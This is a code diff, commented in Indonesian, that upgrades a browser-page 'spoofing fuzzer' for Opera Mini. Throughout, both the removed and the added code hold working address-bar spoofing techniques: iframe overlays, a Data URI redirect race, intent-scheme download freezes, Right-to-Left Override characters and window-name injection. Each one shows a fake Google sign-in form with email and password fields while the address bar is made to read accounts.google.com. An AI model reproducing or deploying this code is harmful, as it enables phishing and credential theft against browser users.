@@ -3,47 +3,59 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Opera Mini Spoofing Fuzzer v3</title>
+<title>Opera Mini Fuzzer v4 - High Impact</title>
 <style>
-    body { font-family: sans-serif; padding: 15px; background: #fafafa; color: #333; }
-    .card { background: #fff; padding: 15px; border: 1px solid #ddd; border-radius: 5px; margin-bottom: 15px; }
-    button { background: #d32f2f; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;}
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 15px; background: #121212; color: #e0e0e0; }
+    .card { background: #1e1e1e; padding: 15px; border: 1px solid #333; border-radius: 8px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+    button { background: #d32f2f; color: white; border: none; padding: 12px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; font-size: 14px; transition: background 0.2s;}
     button:hover { background: #b71c1c; }
-    input { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-    .log-box { background: #222; color: #00ff00; padding: 10px; border-radius: 5px; font-family: monospace; height: 150px; overflow-y: scroll; font-size: 12px; margin-top: 10px;}
-    .title { font-weight: bold; margin-bottom: 5px; color: #d32f2f; }
+    button.blue { background: #1976d2; }
+    button.blue:hover { background: #1565c0; }
+    button.green { background: #388e3c; }
+    button.green:hover { background: #2e7d32; }
+    input { width: 100%; padding: 10px; margin: 5px 0 15px 0; border: 1px solid #444; background: #2d2d2d; color: #fff; border-radius: 4px; box-sizing: border-box; }
+    .log-box { background: #000; color: #00e676; padding: 12px; border-radius: 6px; font-family: 'Courier New', Courier, monospace; height: 180px; overflow-y: scroll; font-size: 12px; margin-top: 10px; border: 1px solid #333;}
+    .title { font-weight: bold; margin-bottom: 5px; color: #ff5252; font-size: 16px;}
+    p { font-size: 13px; color: #aaa; margin-top: 0; line-height: 1.4; }
 </style>
 </head>
 <body>
 
-<h2>Opera Mini Spoofing Fuzzer v3</h2>
-<p>Fokus: Same-Origin Injection, Iframe Overlay, dan Custom Protocol Abuse.</p>
+<h2 style="text-align:center; color:#fff;">High-Impact Spoofing Fuzzer</h2>
+<p style="text-align:center;">Vektor: Intent Abuse, Data URI Race, RTL Override, Window Name.</p>
 
 <div class="card">
-    <div class="title">Target URL / Fake Identity</div>
+    <div class="title">Target Spoofing Domain</div>
     <input type="text" id="targetDomain" value="https://accounts.google.com">
+    <p>Gunakan domain yang ingin ditampilkan di address bar (contoh: https://accounts.google.com).</p>
 </div>
 
 <div class="card">
-    <div class="title">Trik 4: Iframe Overlay (No New Tab)</div>
-    <p style="font-size:12px;">Memuat target asli di iframe, menimpa UI palsu di atasnya, lalu memanipulasi URL via history API (jika memungkinkan).</p>
-    <button onclick="runTrik4()">Jalankan Trik 4</button>
+    <div class="title">1. Intent Scheme + Download Freeze</div>
+    <p>Mencoba memicu download via Intent URL untuk membekukan address bar pada URL target asli.</p>
+    <button class="blue" onclick="runIntentDownload()">Run Intent Download Fuzzer</button>
 </div>
 
 <div class="card">
-    <div class="title">Trik 5: Data URI + Meta Refresh (Top-Level)</div>
-    <p style="font-size:12px;">Paksa tab saat ini untuk load Data URI (UI palsu) yang langsung meredirect ke domain target. Address bar mungkin mengikuti redirect.</p>
-    <button onclick="runTrik5()">Jalankan Trik 5</button>
+    <div class="title">2. Data URI Race (Meta Refresh)</div>
+    <p>Memuat UI palsu via Data URI, lalu memaksa address bar berubah ke target via redirect mikro-detik.</p>
+    <button class="green" onclick="runDataURIRace()">Run Data URI Race</button>
 </div>
 
 <div class="card">
-    <div class="title">Trik 6: Intents / Deep Link Abuse</div>
-    <p style="font-size:12px;">Menggunakan custom scheme Opera untuk membuka URL palsu yang mengandung karakter khusus (Unicode/Bidi) untuk memanipulasi visual address bar.</p>
-    <button onclick="runTrik6()">Jalankan Trik 6</button>
+    <div class="title">3. RTL / Unicode Override (CVE-2019-12278)</div>
+    <p>Memanipulasi visual address bar menggunakan karakter Right-to-Left Override (U+202E) dengan domain attacker.</p>
+    <button onclick="runRTLOverride()">Run RTL Override</button>
 </div>
 
-<h3>Log:</h3>
-<div id="log" class="log-box">Siap...</div>
+<div class="card">
+    <div class="title">4. Window Name Injection</div>
+    <p>Menguji apakah parameter nama window (`window.open`) bocor ke address bar pada engine Opera Mini.</p>
+    <button onclick="runWindowName()">Run Window Name Injection</button>
+</div>
+
+<h3>Execution Log:</h3>
+<div id="log" class="log-box">Siap menerima perintah...</div>
 
 <script>
     const logBox = document.getElementById('log');
@@ -52,83 +64,87 @@
         logBox.scrollTop = logBox.scrollHeight;
     }
 
-    function getFakeUIHTML() {
-        return `
+    const targetInput = document.getElementById('targetDomain');
+
+    // ==========================================
+    // 1. INTENT SCHEME + DOWNLOAD FREEZE
+    // ==========================================
+    function runIntentDownload() {
+        const target = targetInput.value;
+        // Domain attacker untuk file APK (ganti dengan domain kamu sendiri untuk testing)
+        const attackerFile = "https://example.com/file.apk"; 
+        
+        log("Memulai Intent Download Fuzzer...");
+        
+        // Berbagai format Intent yang mungkin masih di-handle oleh engine Opera
+        const intents = [
+            `intent://example.com/file.apk#Intent;scheme=https;package=com.opera.mini.native;end`,
+            `opera-mini://open?url=${encodeURIComponent(attackerFile)}&download=1`,
+            `opera-mini://download?url=${encodeURIComponent(attackerFile)}`,
+            `opera-mini://open?url=${encodeURIComponent(target)}`
+        ];
+
+        intents.forEach((intent, index) => {
+            setTimeout(() => {
+                log(`Menguji Intent Payload #${index + 1}...`);
+                
+                const w = window.open("about:blank", "_blank");
+                if (!w) return log("Popup diblokir!");
+
+                // Picu intent/download
+                w.location.href = intent;
+
+                // Beri waktu download untuk "freeze" address bar, lalu injeksi UI palsu
+                setTimeout(() => {
+                    try {
+                        w.stop();
+                        w.document.open();
+                        w.document.write(`
+                            <html><body style="font-family:sans-serif;text-align:center;padding-top:40px">
+                                <h2>Sign in</h2>
+                                <p>Intent #${index + 1}</p>
+                                <input type="text" placeholder="Email" style="padding:10px;width:80%;margin-bottom:10px;"><br>
+                                <input type="password" placeholder="Password" style="padding:10px;width:80%;margin-bottom:10px;"><br>
+                                <button style="padding:10px 20px;background:#4285F4;color:#fff;border:none;">Next</button>
+                            </body></html>
+                        `);
+                        w.document.close();
+                        log(`-> UI palsu di-inject pada Intent #${index + 1}. Cek Address Bar!`);
+                    } catch(e) {
+                        log(`-> SOP Block / Gagal pada Intent #${index + 1}`);
+                    }
+                }, 150); // Delay 150ms (titik rawan freeze)
+            }, index * 2000);
+        });
+    }
+
+    // ==========================================
+    // 2. DATA URI RACE (META REFRESH)
+    // ==========================================
+    function runDataURIRace() {
+        const target = targetInput.value;
+        log("Memulai Data URI Race...");
+
+        // HTML Palsu yang akan memuat UI, lalu me-redirect address bar ke target
+        const fakeHtml = `
+            <!DOCTYPE html>
             <html>
             <head><title>Sign in</title></head>
-            <body style="font-family:sans-serif; text-align:center; padding-top:40px; background:#fff; margin:0;">
+            <body style="font-family:sans-serif;text-align:center;padding-top:40px;background:#fff;">
                 <h2>Sign in</h2>
-                <p style="color:#666; font-size:12px;">Validating session...</p>
-                <div style="display:inline-block; text-align:left; width:280px;">
-                    <input type="text" placeholder="Email or phone" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; border-radius:4px;"><br>
-                    <input type="password" placeholder="Password" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; border-radius:4px;"><br>
-                    <button style="background:#1a73e8; color:#fff; border:none; padding:10px; width:100%; border-radius:4px; font-weight:bold;">Next</button>
-                </div>
-            </body>
-            </html>
-        `;
-    }
-
-    // ==========================================
-    // TRIK 4: Iframe Overlay
-    // ==========================================
-    function runTrik4() {
-        const target = document.getElementById('targetDomain').value;
-        log("Menjalankan Trik 4: Iframe Overlay...");
-
-        // Buat container full screen
-        const container = document.createElement('div');
-        container.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#fff;";
-
-        // Buat iframe target asli (mungkin terblokir X-Frame-Options)
-        const iframe = document.createElement('iframe');
-        iframe.src = target;
-        iframe.style.cssText = "width:100%;height:100%;border:none;";
-        
-        // Buat UI Palsu di atasnya
-        const overlay = document.createElement('div');
-        overlay.style.cssText = "position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);";
-        overlay.innerHTML = getFakeUIHTML();
-
-        container.appendChild(iframe);
-        container.appendChild(overlay);
-        document.body.appendChild(container);
-
-        log("Iframe overlay dipasang. Perhatikan address bar.");
-        
-        // Coba manipulasi history API saat overlay aktif
-        try {
-            history.pushState({}, '', target);
-            log("-> pushState berhasil di top-level window.");
-        } catch(e) {
-            log("-> pushState diblokir: " + e.message);
-        }
-    }
-
-    // ==========================================
-    // TRIK 5: Data URI Redirect Loop
-    // ==========================================
-    function runTrik5() {
-        const target = document.getElementById('targetDomain').value;
-        log("Menjalankan Trik 5: Data URI Redirect...");
-
-        // Payload HTML palsu yang di-encode ke Data URI
-        // Di dalamnya ada script yang langsung me-redirect ke target setelah UI render
-        const fakeHtml = `
-            <html>
-            <body style="font-family:sans-serif; text-align:center; padding-top:40px; background:#fff;">
-                <h2>Sign in</h2>
-                <p>Loading secure connection...</p>
-                <div style="display:inline-block; text-align:left; width:280px;">
-                    <input type="text" placeholder="Email"><br><br>
-                    <input type="password" placeholder="Password"><br><br>
-                    <button style="width:100%; padding:10px;">Next</button>
+                <p style="color:#555;">Loading secure session...</p>
+                <div style="display:inline-block;text-align:left;width:280px;">
+                    <input type="text" placeholder="Email or phone" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;"><br>
+                    <input type="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;"><br>
+                    <button style="width:100%;padding:10px;background:#4285F4;color:#fff;border:none;">Next</button>
                 </div>
                 <script>
-                    // Tunggu UI render, lalu paksa address bar berubah (pindah origin di background)
-                    setTimeout(() => {
-                        window.location.href = "${target}";
-                    }, 100);
+                    // Paksa redirect tepat setelah DOM di-render
+                    window.onload = function() {
+                        setTimeout(function() {
+                            window.location.href = "${target}";
+                        }, 10); // Race condition 10ms
+                    };
                 <\/script>
             </body>
             </html>
@@ -136,31 +152,62 @@
 
         const dataUri = "data:text/html;charset=utf-8," + encodeURIComponent(fakeHtml);
         
-        // Arahkan window utama ke data URI
-        window.location.href = dataUri;
-        
-        log("Data URI dieksekusi. Jika UI tampil, lihat apakah address bar berubah jadi target atau tetap 'data:'.");
+        const w = window.open(dataUri, "_blank");
+        if (!w) return log("Popup diblokir!");
+
+        log("Data URI dibuka. Perhatikan apakah address bar berubah menjadi target, atau UI palsu tetap bertahan.");
     }
 
     // ==========================================
-    // TRIK 6: Unicode / IDN Homograph Spoofing
+    // 3. RTL / UNICODE OVERRIDE
     // ==========================================
-    function runTrik6() {
-        log("Menjalankan Trik 6: Custom Scheme URL Obfuscation...");
-        
-        // Trik menggunakan karakter Unicode atau Right-to-Left Override (U+202E)
-        // Contoh: google.com menjadi google.com dengan karakter aneh
-        const unicodeDomain = "https://accounts.google.com\u202E\u006D\u006F\u0063\u002E\u0065\u006C\u0067\u006F\u006F\u0067"; 
-        
-        // Atau pakai domain yang sangat panjang agar terpotong (Left-Align bug lama)
-        const longDomain = "https://accounts.google.com.security-update-required.attacker-server.com";
+    function runRTLOverride() {
+        log("Memulai RTL Override...");
 
-        const payload = `opera-mini://open?url=${encodeURIComponent(longDomain)}`;
+        // Karakter U+202E membalik urutan teks ke kanan-ke-kiri.
+        // Payload ini akan membuat domain attacker terlihat seperti subdomain dari target.
+        // Contoh visual: https://accounts.google.com/gpj.niapuk
+        const rtlTarget = "https://accounts.google.com/";
+        const reversedAttacker = "\u202Egpj.niapuk"; // "kupain.jpg" dibalik
         
-        log(`Payload: ${payload}`);
-        window.location.href = payload;
-        
-        log("Perhatikan address bar. Apakah terpotong dan hanya menampilkan bagian awal (google.com)?");
+        // Kita buat URL seolah-olah dari domain google, tapi aslinya ke attacker
+        const payloadUrl = `${rtlTarget}${reversedAttacker}`;
+
+        const w = window.open("about:blank", "_blank");
+        if (!w) return log("Popup diblokir!");
+
+        w.location.href = payloadUrl;
+        log(`Payload RTL dikirim: ${payloadUrl}`);
+        log("Cek address bar: Apakah menampilkan 'accounts.google.com/kupain.jpg' atau 'attacker'?");
+    }
+
+    // ==========================================
+    // 4. WINDOW NAME INJECTION
+    // ==========================================
+    function runWindowName() {
+        const target = targetInput.value;
+        log("Memulai Window Name Injection...");
+
+        // Engine lama kadang menampilkan window name di title bar / address bar
+        try {
+            const w = window.open("about:blank", target);
+            if (!w) return log("Popup diblokir!");
+
+            // Render UI palsu di dalam window tersebut
+            w.document.write(`
+                <html><body style="font-family:sans-serif;text-align:center;padding-top:40px;background:#fff;">
+                    <h2>Sign in</h2>
+                    <input type="text" placeholder="Email" style="padding:10px;margin-bottom:10px;"><br>
+                    <input type="password" placeholder="Password" style="padding:10px;margin-bottom:10px;"><br>
+                    <button style="padding:10px 20px;background:#1a73e8;color:#fff;border:none;">Next</button>
+                </body></html>
+            `);
+            w.document.close();
+            log(`Window dibuka dengan nama: ${target}`);
+            log("Cek address bar: Apakah menampilkan 'about:blank' atau URL target?");
+        } catch(e) {
+            log("Window Name Injection gagal: " + e.message);
+        }
     }
 </script>
 </body>
